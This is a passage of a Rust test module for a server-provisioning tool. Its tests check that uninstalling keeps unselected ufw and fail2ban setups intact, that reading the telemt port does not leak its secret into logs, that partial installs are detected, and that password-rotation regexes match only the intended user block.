        assert!(!ufw_purge.contains("apt-get autoremove"), "ufw purge must not cascade-autoremove");
        assert!(!f2b_purge.contains("apt-get autoremove"), "fail2ban purge must not cascade-autoremove");
    }

    #[test]
    fn unchecked_component_is_kept_as_is_not_disabled_or_stripped_wr1_wr2() {
        // WR-1/WR-2 (Phase-18 re-review): unchecking a component means «keep it». The keep-as-is
        // branch must NOT disable the firewall (WR-1) and must NOT delete our fail2ban jail.local
        // (WR-2 — it carries the admin-IP ignoreip self-ban whitelist).
        // ufw KEEP (selected=false): emit nothing that turns the firewall off.
        let ufw_keep = build_ufw_deprovision("sudo ", false, false);
        assert!(!ufw_keep.contains("ufw --force disable"), "keeping ufw must NOT disable it: {ufw_keep}");
        assert!(!ufw_keep.contains("apt-get purge -y ufw"), "keeping ufw must NOT purge it: {ufw_keep}");
        // fail2ban KEEP (selected=false): preserve jail.local + the ignoreip whitelist; no reload.
        let f2b_keep = build_fail2ban_deprovision("sudo ", false, false);
        assert!(
            !f2b_keep.contains("rm -f /etc/fail2ban/jail.local"),
            "keeping fail2ban must NOT delete jail.local (loses the ignoreip whitelist): {f2b_keep}"
        );
        assert!(!f2b_keep.contains("systemctl stop fail2ban"), "keeping fail2ban must NOT stop it: {f2b_keep}");
        assert!(!f2b_keep.contains("apt-get purge -y fail2ban"), "keeping fail2ban must NOT purge it: {f2b_keep}");
        // The whole-script view: unchecking both keeps them intact even with a snapshot-absent
        // record. Match the COMMAND form (`… 2>/dev/null`) so the assertion never trips on the
        // literal `ufw --force disable` that appears in the script's explanatory comments.
        let sel_keep = UninstallSelection { ufw: false, fail2ban: false, ..UninstallSelection::restore_all() };
        let s = script_with(&sel_keep, Some(&snapshot_all_ours()), 0);
        assert!(!s.contains("ufw --force disable 2>/dev/null"), "unchecked ufw must not be disabled at script level: {s}");
        assert!(!s.contains("rm -f /etc/fail2ban/jail.local 2>/dev/null"), "unchecked fail2ban jail.local must survive: {s}");
    }

    #[test]
    fn uninstall_teardown_reads_only_the_telemt_port_never_the_secret_c01() {
        // C-01 (RUNTIME, replaces the old source-grep D-29 test which was structurally
        // blind to exec_command's log echo): the uninstall path must resolve the telemt
        // port WITHOUT `cat`-ing the whole telemt.toml — otherwise exec_command echoes the
        // `[access.users] trusttunnel = "<hex>"` secret line into stderr + the deploy-log
        // event + app.log on EVERY uninstall.
        let cmd = super::super::server_mtproto::build_telemt_port_read("sudo ");
        assert!(cmd.contains("grep"), "port read must grep, not cat: {cmd}");
        assert!(
            !cmd.contains("cat /etc/telemt/telemt.toml"),
            "port read must NOT cat the whole telemt.toml (that leaks the secret): {cmd}"
        );
        assert!(cmd.contains("/etc/telemt/telemt.toml"), "port read must target telemt.toml: {cmd}");

        // The parser turns the grep output (bare digits) into the integer.
        assert_eq!(super::super::server_mtproto::parse_telemt_port_line("8443\n"), 8443);
        assert_eq!(super::super::server_mtproto::parse_telemt_port_line(""), 0);

        // Belt-and-suspenders: even a leaked telemt secret LINE is redacted by the log
        // sanitizer before any emit, so a future accidental full-file read cannot leak it.
        let hex = "0123456789abcdef0123456789abcdef";
        let leaked = format!("trusttunnel = \"{hex}\"");
        assert!(
            !crate::logging::sanitize(&leaked).contains(hex),
            "telemt secret must be redacted by sanitize before any emit"
        );
    }

    // ── derive_partial: server-verified resume probe (WIZARD-02, Codex #4, finding G) ──

    #[test]
    fn derive_partial_binary_only_is_partial() {
        // Binary present but nothing else → partial install.
        assert!(derive_partial(
            true,  // binary
            false, false, false, false, false, // creds/rules/vpn/hosts/cert
            false, false, false, // unit_exists/unit_enabled/unit_active
        ));
    }

    #[test]
    fn derive_partial_binary_present_no_credentials_is_partial() {
        // binaryInstalled && !credentialsExist ⇒ partial=true (the canonical case).
        assert!(derive_partial(
            true,  // binary
            false, // credentials MISSING
            true, true, true, true, // rules/vpn/hosts/cert
            true, true, true, // unit present + enabled + active
        ));
    }

    #[test]
    fn derive_partial_all_present_enabled_active_is_complete() {
        // Everything present + unit enabled + active ⇒ partial=false (done-eligible).
        assert!(!derive_partial(
            true,  // binary
            true, true, true, true, true, // creds/rules/vpn/hosts/cert
            true,  // unit_exists
            true,  // unit_enabled
            true,  // unit_active
        ));
    }

    #[test]
    fn derive_partial_unit_present_but_not_enabled_is_partial() {
        // FINDING G: unit EXISTS but is NOT enabled (everything else present) ⇒
        // partial=true. The `systemctl enable --now` step is not done.
        assert!(derive_partial(
            true,  // binary
            true, true, true, true, true, // all config + cert present
            true,  // unit_exists
            false, // unit_enabled — NOT enabled
            true,  // unit_active (running but not enabled — still partial)
        ));
    }

    #[test]
    fn derive_partial_not_installed_is_not_partial() {
        // No binary → clean slate, NOT partial.
        assert!(!derive_partial(
            false, // binary
            false, false, false, false, false,
            false, false, false,
        ));
    }

    #[test]
    fn derive_partial_enabled_but_not_active_is_partial() {
        // Unit enabled but the service is not running ⇒ partial=true.
        assert!(derive_partial(
            true,  // binary
            true, true, true, true, true,
            true,  // unit_exists
            true,  // unit_enabled
            false, // unit_active — NOT running
        ));
    }

    #[test]
    fn rotate_password_regex_matches_user_block() {
        use regex::Regex;
        let sample = "[[client]]\nusername = \"alice\"\npassword = \"old_secret\"\n";
        let re = Regex::new(
            r#"(\[\[client\]\]\s*\nusername\s*=\s*"alice"\s*\npassword\s*=\s*")[^"]*(")"#
        ).unwrap();
        let replaced = re.replace(sample, "${1}new_secret${2}").to_string();
        assert!(replaced.contains("password = \"new_secret\""));
        assert!(!replaced.contains("old_secret"));
    }

    #[test]
    fn rotate_password_regex_misses_wrong_user() {
        use regex::Regex;
        let sample = "[[client]]\nusername = \"bob\"\npassword = \"bob_secret\"\n";
        let re = Regex::new(
            r#"(\[\[client\]\]\s*\nusername\s*=\s*"alice"\s*\npassword\s*=\s*")[^"]*(")"#
        ).unwrap();
        let n = re.find_iter(sample).count();
        assert_eq!(n, 0);
    }
}
